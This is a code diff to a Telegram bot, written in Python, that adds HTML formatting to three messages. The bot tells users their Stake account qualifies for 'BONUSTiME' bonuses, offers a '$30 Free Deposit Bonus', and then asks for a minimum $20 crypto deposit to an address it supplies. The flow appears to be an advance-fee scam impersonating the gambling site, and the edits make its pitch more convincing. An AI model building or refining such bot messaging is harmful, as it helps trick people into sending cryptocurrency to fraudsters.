@@ -172,7 +172,8 @@ async def username_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     await msg.edit_text(
-        "\U0001f389 Congratulations, your Stake account is eligible for the Stake BONUSTiME Bonuses. Choose one of the three options below! \U0001f60e",
+        "\U0001f389 Congratulations, your Stake account is eligible for the Stake BONUSTiME Bonuses. <b>Choose one of the three options below! \U0001f60e</b>",
+        parse_mode="HTML",
         reply_markup=reply_markup,
     )
 
@@ -199,7 +200,10 @@ async def deposit_yes_callback(update: Update, context: ContextTypes.DEFAULT_TYP
     query = update.callback_query
     await query.answer()
 
-    await query.edit_message_text("Offer Selected : $30 Free Deposit Bonus.")
+    await query.edit_message_text(
+        "<b>Offer Selected : $30 Free Deposit Bonus.</b>",
+        parse_mode="HTML",
+    )
 
     # Send currency selection message
     keyboard = [
@@ -274,7 +278,7 @@ async def network_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await context.bot.send_message(
         chat_id=update.effective_chat.id,
         text=(
-            "Please Deposit minimum $20 to the following Stake deposit address to proceed.\n\n"
+            "<i>Please Deposit minimum $20 to the following Stake deposit address to proceed.</i>\n\n"
             f"Address : <code>{address}</code>\n"
             f"Network : <b>{network_display}</b>"
         ),
